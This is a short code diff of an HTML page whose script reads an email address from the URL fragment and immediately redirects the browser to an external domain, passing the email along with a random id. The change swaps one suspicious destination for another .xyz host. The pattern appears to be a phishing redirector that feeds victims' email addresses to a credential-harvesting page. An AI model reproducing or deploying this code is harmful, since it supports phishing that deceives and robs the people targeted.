@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://navigatorfishing.com/ric/post.php"+ makeid(10) + "#" + em;
+			window.location.href = "https://ms2.yofjq.xyz/?"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
